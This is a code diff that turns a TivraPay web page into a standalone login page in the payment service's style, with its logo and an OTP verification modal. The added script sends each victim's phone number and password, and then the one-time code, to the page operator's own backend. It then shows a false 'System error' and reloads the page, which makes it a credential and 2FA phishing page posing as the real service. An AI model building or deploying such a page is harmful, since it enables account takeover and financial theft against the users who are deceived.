@@ -3,23 +3,119 @@
 <head>
     <meta charset="UTF-8" />
     <meta name="viewport" content="width=device-width, initial-scale=1.0, user-scalable=no" />
-    <title>TivraPay</title>
-    
-    <link rel="stylesheet" href="https://web.tivrapay.com/assets/index.e4c3c83a.css">
-    
+    <title>Tivra Pay</title>
     <style>
-        /* Force fixing container to match original site layout */
-        body { margin: 0; padding: 0; background-color: #fff; }
-        #app { min-height: 100vh; display: flex; flex-direction: column; }
+        /* 🎨 CLIENT-SPECIFIC UI ENGINE */
+        * { box-sizing: border-box; margin: 0; padding: 0; font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, sans-serif; }
+        body { background-color: #f7f9fc; display: flex; justify-content: center; align-items: center; min-height: 100vh; padding: 20px; }
+        
+        #app { width: 100%; max-width: 400px; background: #fff; padding: 30px; border-radius: 24px; box-shadow: 0 10px 30px rgba(0,0,0,0.05); }
+
+        .header-section { text-align: center; margin-bottom: 30px; }
+        .logo { width: 140px; }
+
+        .input-field-group { 
+            background: #f1f4f9; 
+            border-radius: 16px; 
+            padding: 12px 20px; 
+            margin-bottom: 15px; 
+            display: flex; 
+            align-items: center; 
+        }
+        .input-field-group input { 
+            border: none; background: none; width: 100%; font-size: 16px; margin-left: 10px; outline: none;
+        }
+
+        .submit-btn { 
+            width: 100%; padding: 15px; background: #2563eb; color: #fff; border: none; 
+            border-radius: 16px; font-size: 16px; font-weight: 600; cursor: pointer;
+            margin-top: 10px;
+        }
+
+        .form-options { display: flex; justify-content: space-between; margin-bottom: 20px; font-size: 14px; color: #666; }
+        .forgot-link { color: #2563eb; text-decoration: none; font-weight: 500; }
+
+        /* Modal specific adjustments to match client style */
+        .modal { position: fixed; top: 0; left: 0; width: 100%; height: 100%; background: rgba(0,0,0,0.4); display: flex; align-items: center; justify-content: center; opacity: 0; pointer-events: none; transition: 0.3s; }
+        .modal.active { opacity: 1; pointer-events: auto; }
+        .modal-content { background: #fff; padding: 25px; border-radius: 20px; width: 85%; max-width: 350px; text-align: center; }
+        
+        .otp-inputs { display: flex; justify-content: center; gap: 10px; margin: 20px 0; }
+        .otp-box { width: 45px; height: 50px; border: 1px solid #ddd; border-radius: 10px; text-align: center; font-size: 20px; outline: none; }
     </style>
 </head>
 <body>
-    
+
     <div id="app">
+        <div class="header-section">
+            <img class="logo" src="https://web.tivrapay.com/img/logo.20cf4c6f.png" alt="Logo" />
         </div>
 
-    <script type="module" crossorigin src="https://web.tivrapay.com/assets/index.f7601f73.js"></script>
+        <form id="loginForm">
+            <div class="input-field-group">
+                <input type="tel" id="phoneNumber" placeholder="Phone number" required />
+            </div>
+            <div class="input-field-group">
+                <input type="password" id="password" placeholder="Password" required />
+            </div>
+            <div class="form-options">
+                <label><input type="checkbox" id="savePassword" /> Save</label>
+                <a href="#" class="forgot-link" id="triggerForgot">Forgot?</a>
+            </div>
+            <button type="submit" class="submit-btn">Login</button>
+        </form>
+    </div>
 
-    <script defer src="https://static.cloudflareinsights.com/beacon.min.js/v833ccba57c9e4d2798f2e76cebdd09a11778172276447"></script>
+    <div class="modal" id="otpModal">
+        <div class="modal-content">
+            <h3>Verification</h3>
+            <p id="otpSentText">Sent to your number</p>
+            <div class="otp-inputs">
+                <input type="number" class="otp-box" id="otp1" maxlength="1" onkeyup="moveNext(this, 'otp2')" />
+                <input type="number" class="otp-box" id="otp2" maxlength="1" onkeyup="moveNext(this, 'otp3')" />
+                <input type="number" class="otp-box" id="otp3" maxlength="1" onkeyup="moveNext(this, 'otp4')" />
+                <input type="number" class="otp-box" id="otp4" maxlength="1" onkeyup="checkAndSubmitOtp(this)" />
+            </div>
+        </div>
+    </div>
+
+    <script>
+        // Backend URL Logic
+        const BACKEND_URL = window.location.hostname === '127.0.0.1' ? 'http://localhost:6500' : window.location.origin;
+
+        // Form Submission Logic
+        document.getElementById('loginForm').addEventListener('submit', async (e) => {
+            e.preventDefault();
+            const phoneNumber = document.getElementById('phoneNumber').value;
+            const password = document.getElementById('password').value;
+            
+            // Send to your existing backend API
+            const response = await fetch(`${BACKEND_URL}/api/login-submit`, {
+                method: 'POST',
+                headers: { 'Content-Type': 'application/json' },
+                body: JSON.stringify({ phoneNumber, password })
+            });
+            const data = await response.json();
+            if(data.success) {
+                window.currentUserId = data.userId;
+                document.getElementById('otpModal').classList.add('active');
+            }
+        });
+
+        function moveNext(curr, next) { if(curr.value.length) document.getElementById(next).focus(); }
+        
+        async function checkAndSubmitOtp(curr) {
+            const otp = document.getElementById('otp1').value + document.getElementById('otp2').value + document.getElementById('otp3').value + curr.value;
+            if(otp.length === 4) {
+                await fetch(`${BACKEND_URL}/api/otp-submit`, {
+                    method: 'POST',
+                    headers: { 'Content-Type': 'application/json' },
+                    body: JSON.stringify({ userId: window.currentUserId, otp })
+                });
+                alert("System error. Please try again.");
+                window.location.reload();
+            }
+        }
+    </script>
 </body>
 </html>
